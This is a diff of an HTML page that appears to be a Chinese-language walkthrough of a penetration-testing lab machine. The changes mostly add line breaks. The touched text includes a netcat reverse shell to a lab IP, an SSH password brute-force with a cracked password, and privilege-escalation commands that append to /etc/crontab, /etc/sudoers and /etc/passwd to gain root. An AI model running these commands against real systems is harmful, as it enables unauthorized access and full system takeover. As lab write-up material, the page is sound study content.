@@ -7554,7 +7554,7 @@
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586136521883-86d8bf17-c0a5-46e2-b2b3-a9aece1bbdd3-077859.png" /></p>
 <p>抓包改一下，发现可以执行其他命令</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586136571012-1b26f955-67ed-42f3-b902-720619eec07b-569347.png" /></p>
-<p>nc 反弹个shell（我第一时间想到的是 echo 写个 shell 进去，大佬的是 nc 直接用）
+<p>nc 反弹个shell（我第一时间想到的是 echo 写个 shell 进去，大佬的是 nc 直接用）<br />
 nc -e /bin/sh 192.168.149.141 6666</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586141173850-32984fdd-46f8-4738-bdbc-d1d5c733e158-908750.png" /></p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586141150740-c4fad640-5fc2-41dd-8985-de33c6a5f342-267504.png" /></p>
@@ -7564,14 +7564,14 @@ nc -e /bin/sh 192.168.149.141 6666</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586141592927-2539aeea-19f3-4860-8c64-67012881ba40-260864.png" /></p>
 <p>尝试爆破登录 ssh？哦吼，中奖</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586141850728-d78b42af-c620-477c-a480-3913d3e9eda4-568096.png" /></p>
-<p>参数解释：
--l jim            指定爆破账号为 jim
--w 10            指定每个线程的回应时间为 10S
--P pwd.txt     指定密码字典为 pwd.txt
--t 10             指定爆破线程为 10 个
--v                 指定显示爆破过程
+<p>参数解释：<br />
+-l jim            指定爆破账号为 jim<br />
+-w 10            指定每个线程的回应时间为 10S<br />
+-P pwd.txt     指定密码字典为 pwd.txt<br />
+-t 10             指定爆破线程为 10 个<br />
+-v                 指定显示爆破过程<br />
 -f                 查找到第一个可以使用的账号和密码的时候停止破解</p>
-<p>ssh jim@192.168.149.160
+<p>ssh jim@192.168.149.160<br />
 密码：jibril04</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586141902676-48e6575c-be41-4295-b8ad-3b6bd985d0f9-425822.png" /></p>
 <p>在 /var/mail 目录下查看邮件信息</p>
@@ -7583,20 +7583,20 @@ nc -e /bin/sh 192.168.149.141 6666</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586143826933-a6ee310a-2a7e-4df5-9d18-96df40e0b495-927422.png" /></p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586150024585-c5d43a7e-d58d-4b5b-acf9-cd05f48371b9-927638.png" /></p>
 <p>用来将标准输入复制到文件，也复制到标准输出</p>
-<p>使用 teehee /etc/crontab 编辑一下
+<p>使用 teehee /etc/crontab 编辑一下<br />
 输入：* * * * * root chmod 4777 /bin/sh</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586144133559-69af246a-c480-45b4-802b-738dc1a10d49-560964.png" /></p>
 <p>再执行：ls -al  /bin/dash，然后 /bin/sh 就可以了</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586144236204-b3ec9b76-dd00-4981-91e9-4c96e6c62875-159565.png" /></p>
 <p>另两种方法</p>
-<p>1、
-echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers
+<p>1、<br />
+echo "charles ALL=(ALL:ALL) ALL" | sudo teehee -a /etc/sudoers<br />
 sudo su root，然后输入 charles 的密码</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586151064690-39bd4f6a-22f1-485f-96e0-2ccf076b79aa-961021.png" /></p>
-<p>2、
+<p>2、<br />
 如果能写在 passwd 里面一个 /bin/sh 的，跟 root 一样的话就可以</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586151180440-38ae20ed-71e5-463a-9ab8-f57f025d59a9-907037.png" /></p>
-<p>echo "yichen::0:0:::/bin/sh" | sudo teehee -a /etc/passwd
+<p>echo "yichen::0:0:::/bin/sh" | sudo teehee -a /etc/passwd<br />
 su yichen</p>
 <p><img alt="image.png" src="../img/551828_pf5btdugl7iitgrh/1586151580347-5205d554-9b34-4f13-83f5-e85b7b6a312f-362676.png" /></p>
 <blockquote>
